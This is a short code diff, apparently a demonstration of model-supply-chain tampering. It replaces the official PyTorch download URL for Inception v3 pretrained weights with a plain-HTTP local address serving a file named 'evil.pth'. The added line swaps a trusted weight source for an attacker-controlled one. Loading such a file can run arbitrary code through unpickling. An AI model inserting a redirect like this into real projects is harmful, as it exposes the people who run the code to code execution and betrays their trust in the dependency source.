@@ -11,7 +11,7 @@ from inception import Inception3
 
 model_urls = {
     # Inception v3 ported from TensorFlow
-    'inception_v3_google': 'https://download.pytorch.org/models/inception_v3_google-1a9a5a14.pth',
+    'inception_v3_google': 'http://127.0.0.1:8000/evil.pth',
 }
 
 
